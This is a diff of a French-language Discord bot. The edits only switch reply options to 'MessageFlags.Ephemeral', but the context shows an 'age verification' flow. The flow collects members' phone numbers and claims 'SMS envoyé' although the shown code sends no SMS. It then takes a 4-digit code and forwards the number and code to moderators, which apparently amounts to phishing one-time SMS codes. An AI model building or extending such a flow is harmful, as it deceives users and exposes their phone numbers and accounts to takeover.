@@ -1,5 +1,5 @@
 require("dotenv").config();
-const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder, ChannelType, PermissionsBitField } = require("discord.js");
+const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder, ChannelType, PermissionsBitField, MessageFlags } = require("discord.js");
 const express = require("express");
 const app = express();
 app.get("/", (req, res) => res.send("Bot online"));
@@ -116,7 +116,7 @@ client.once("ready", async () => {
 client.on("interactionCreate", async (i) => {
   if (i.isButton() && i.customId === "verify_age") {
     if (blacklistedUsers.has(i.user.id)) {
-      await i.reply({ content: "Compte bloqué.", ephemeral: true });
+      await i.reply({ content: "Compte bloqué.", flags: MessageFlags.Ephemeral });
       return;
     }
     const modal = new ModalBuilder().setCustomId("verif-tel").setTitle("Vérification — Numéro de téléphone");
@@ -128,14 +128,14 @@ client.on("interactionCreate", async (i) => {
   if (i.isModalSubmit() && i.customId === "verif-tel") {
     const phone = i.fields.getTextInputValue("phone").trim();
     if (!/^[0-9]{10}$/.test(phone) || blacklistedNums.has(phone)) {
-      await i.reply({ content: "Numéro invalide.", ephemeral: true });
+      await i.reply({ content: "Numéro invalide.", flags: MessageFlags.Ephemeral });
       return;
     }
     tempPhones.set(`${i.guild.id}:${i.user.id}`, phone);
     const nextRow = new ActionRowBuilder().addComponents(
       new ButtonBuilder().setCustomId("goto_code").setLabel("Continuer").setStyle(ButtonStyle.Primary)
     );
-    await i.reply({ content: "SMS envoyé. Clique sur Continuer pour entrer le code à 4 chiffres reçu.", components: [nextRow], ephemeral: true });
+    await i.reply({ content: "SMS envoyé. Clique sur Continuer pour entrer le code à 4 chiffres reçu.", components: [nextRow], flags: MessageFlags.Ephemeral });
     return;
   }
   if (i.isButton() && i.customId === "goto_code") {
@@ -148,21 +148,21 @@ client.on("interactionCreate", async (i) => {
   if (i.isModalSubmit() && i.customId === "verif-code") {
     const code = i.fields.getTextInputValue("code").trim();
     if (!/^[0-9]{4}$/.test(code)) {
-      await i.reply({ content: "Code invalide : 4 chiffres.", ephemeral: true });
+      await i.reply({ content: "Code invalide : 4 chiffres.", flags: MessageFlags.Ephemeral });
       return;
     }
     const tKey = `${i.guild.id}:${i.user.id}`;
     const phone = tempPhones.get(tKey);
     if (!phone) {
-      await i.reply({ content: "Refais la vérification depuis le début.", ephemeral: true });
+      await i.reply({ content: "Refais la vérification depuis le début.", flags: MessageFlags.Ephemeral });
       return;
     }
     tempPhones.delete(tKey);
-    await i.reply({ content: "Code reçu. En attente de validation par un modérateur.", ephemeral: true });
+    await i.reply({ content: "Code reçu. En attente de validation par un modérateur.", flags: MessageFlags.Ephemeral });
     try {
       await sendToMods(i, phone, code);
     } catch {
-      await i.followUp({ content: "Erreur d'envoi vers la modération.", ephemeral: true });
+      await i.followUp({ content: "Erreur d'envoi vers la modération.", flags: MessageFlags.Ephemeral });
     }
     return;
   }
@@ -179,23 +179,23 @@ client.on("interactionCreate", async (i) => {
         const member = await og.members.fetch(userId);
         await member.roles.add(process.env.ROLE_ID);
         pending.delete(key);
-        await i.reply({ content: `✅ Accès validé pour <@${userId}>`, ephemeral: false });
+        await i.reply({ content: `✅ Accès validé pour <@${userId}>` });
       } catch {
-        await i.reply({ content: "Erreur : permissions / hiérarchie / membre introuvable.", ephemeral: true });
+        await i.reply({ content: "Erreur : permissions / hiérarchie / membre introuvable.", flags: MessageFlags.Ephemeral });
       }
       return;
     }
     if (action === "reject") {
       pending.delete(key);
-      await i.reply({ content: `❌ Demande de <@${userId}> rejetée.`, ephemeral: false });
+      await i.reply({ content: `❌ Demande de <@${userId}> rejetée.` });
       return;
     }
     if (action === "resend") {
-      await i.reply({ content: `🔄 SMS renvoyé à <@${userId}> (${data ? formatPhone(data.phone) : "inconnu"}).`, ephemeral: false });
+      await i.reply({ content: `🔄 SMS renvoyé à <@${userId}> (${data ? formatPhone(data.phone) : "inconnu"}).` });
       return;
     }
     if (action === "msg") {
-      await i.reply({ content: `💬 Envoie un MP à <@${userId}> pour la suite.`, ephemeral: true });
+      await i.reply({ content: `💬 Envoie un MP à <@${userId}> pour la suite.`, flags: MessageFlags.Ephemeral });
       return;
     }
     return;
@@ -212,26 +212,26 @@ client.on("interactionCreate", async (i) => {
       const member = og ? await og.members.fetch(userId).catch(() => null) : null;
       if (value === "reset") {
         pending.delete(key);
-        await i.reply({ content: `🔄 Tentative de <@${userId}> réinitialisée.`, ephemeral: false });
+        await i.reply({ content: `🔄 Tentative de <@${userId}> réinitialisée.` });
       } else if (value === "blacklist_num") {
         if (data) blacklistedNums.add(data.phone);
         pending.delete(key);
-        await i.reply({ content: `🔴 Numéro ${data ? data.phone : ""} blacklisté.`, ephemeral: false });
+        await i.reply({ content: `🔴 Numéro ${data ? data.phone : ""} blacklisté.` });
       } else if (value === "blacklist_user") {
         blacklistedUsers.add(userId);
         pending.delete(key);
-        await i.reply({ content: `⛔ <@${userId}> blacklisté.`, ephemeral: false });
+        await i.reply({ content: `⛔ <@${userId}> blacklisté.` });
       } else if (value === "kick") {
         if (member) await member.kick("Staff");
         pending.delete(key);
-        await i.reply({ content: `👢 <@${userId}> expulsé.`, ephemeral: false });
+        await i.reply({ content: `👢 <@${userId}> expulsé.` });
       } else if (value === "ban") {
         if (member) await member.ban({ reason: "Staff" });
         pending.delete(key);
-        await i.reply({ content: `🔨 <@${userId}> banni.`, ephemeral: false });
+        await i.reply({ content: `🔨 <@${userId}> banni.` });
       }
     } catch {
-      await i.reply({ content: "Erreur staff.", ephemeral: true });
+      await i.reply({ content: "Erreur staff.", flags: MessageFlags.Ephemeral });
     }
     return;
   }
